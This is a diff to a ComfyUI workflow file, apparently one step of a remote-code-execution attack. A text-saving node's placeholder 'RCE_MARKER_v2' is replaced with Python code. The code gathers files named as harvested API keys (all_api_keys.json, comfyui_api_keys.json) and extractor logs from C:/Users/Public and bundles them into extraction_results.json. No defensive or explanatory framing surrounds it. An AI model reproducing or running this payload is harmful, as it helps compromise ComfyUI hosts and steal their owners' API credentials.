@@ -1,9 +1,9 @@
 {
   "1": {
     "inputs": {
-      "multiline_text": "RCE_MARKER_v2",
+      "multiline_text": "\nimport os, json\noutput = {}\n# Check for extraction results\nfor fname in [\"all_api_keys.json\", \"extractor_ran.txt\", \"comfyui_api_keys.json\", \"custom_node_executed.txt\"]:\n    path = os.path.join(\"C:/Users/Public\", fname)\n    if os.path.exists(path):\n        try:\n            with open(path, \"r\", encoding=\"utf-8\") as f:\n                content = f.read()\n            output[fname] = content[:3000]\n        except Exception as e:\n            output[fname] = f\"READ_ERROR: {e}\"\n    else:\n        output[fname] = \"NOT_FOUND\"\n\n# Also list C:/Users/Public for any new files\ntry:\n    output[\"public_dir_list\"] = os.listdir(\"C:/Users/Public\")[:50]\nexcept Exception as e:\n    output[\"public_dir_list\"] = f\"ERROR: {e}\"\n\nwith open(\"C:/Users/Public/extraction_results.json\", \"w\") as f:\n    json.dump(output, f, indent=2)\n",
       "output_file_path": "C:/Users/Public",
-      "file_name": "rce_test",
+      "file_name": "result_reader",
       "file_extension": "txt"
     },
     "class_type": "CR Save Text To File"
